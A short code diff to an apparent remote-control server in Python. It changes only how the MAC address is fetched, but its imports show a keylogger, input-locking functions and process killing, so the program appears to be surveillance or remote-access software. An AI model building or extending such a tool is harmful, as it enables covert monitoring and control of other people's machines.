@@ -1,7 +1,7 @@
 from os import kill
 import socket
 import struct
-from getmac import get_mac_address 
+from get_mac import get_all_mac
 from keylogger import KeyLogger
 from disable_input import lock_input, unlock_input
 from file_management import *
@@ -172,7 +172,7 @@ class SocketServer:
             self.__keylogger = None
 
     def __request_mac_handler(self):
-        return str(get_mac_address())
+        return get_all_mac()
     
     def start_server(self):
         """
